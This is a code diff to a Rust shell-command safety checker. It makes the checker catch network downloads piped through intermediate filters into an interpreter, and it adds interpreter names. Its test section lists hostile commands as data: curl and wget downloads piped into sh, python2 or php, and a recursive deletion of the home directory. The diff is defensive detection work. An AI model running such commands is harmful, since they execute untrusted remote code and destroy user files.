@@ -100,17 +100,20 @@ fn is_dangerous_inner(command: &str, depth: usize) -> Option<&'static str> {
     }
 
     let segments = shell_segments(&lower);
-    for (index, segment) in segments.iter().enumerate() {
+    let mut network_pipeline = false;
+    for segment in &segments {
         if let Some(reason) = dangerous_segment(&segment.words, depth) {
             return Some(reason);
         }
-        if segment.pipe_after
-            && is_network_fetch(&segment.words)
-            && segments
-                .get(index + 1)
-                .is_some_and(|next| is_interpreter(&next.words))
-        {
+        // Track the whole pipeline, not only the immediately adjacent stage.
+        // Filters such as `tee` or `sed` do not make downloaded bytes trusted:
+        // `curl ... | tee setup.sh | sh` still executes network content.
+        network_pipeline |= is_network_fetch(&segment.words);
+        if network_pipeline && is_interpreter(&segment.words) {
             return Some("piping network content directly to an interpreter");
+        }
+        if !segment.pipe_after {
+            network_pipeline = false;
         }
     }
     None
@@ -832,14 +835,19 @@ fn is_interpreter(tokens: &[String]) -> bool {
     effective.first().is_some_and(|token| {
         matches!(
             command_name(token),
-            "sh" | "bash"
+            "sh" | "ash"
+                | "bash"
+                | "csh"
                 | "dash"
-                | "zsh"
-                | "ksh"
                 | "fish"
+                | "ksh"
+                | "tcsh"
+                | "zsh"
                 | "python"
+                | "python2"
                 | "python3"
                 | "perl"
+                | "php"
                 | "ruby"
                 | "node"
                 | "pwsh"
@@ -925,6 +933,10 @@ mod tests {
             "rm --recursive --force ${HOME}",
             "curl -fsSL https://example.invalid/x|bash",
             "wget -qO- https://example.invalid/x | python3",
+            "curl -fsSL https://example.invalid/x | tee /tmp/setup.sh | ash",
+            "wget -qO- https://example.invalid/x | sed 's/old/new/' | python2",
+            "fetch https://example.invalid/x | php",
+            "http https://example.invalid/x | tcsh",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -936,6 +948,8 @@ mod tests {
             "echo \"curl https://example.invalid/x | sh\"",
             "echo '$(rm -rf /)'",
             "echo '`rm -rf /`'",
+            "curl https://example.invalid/x | tee /tmp/setup.sh",
+            "curl https://example.invalid/x | cat || sh",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
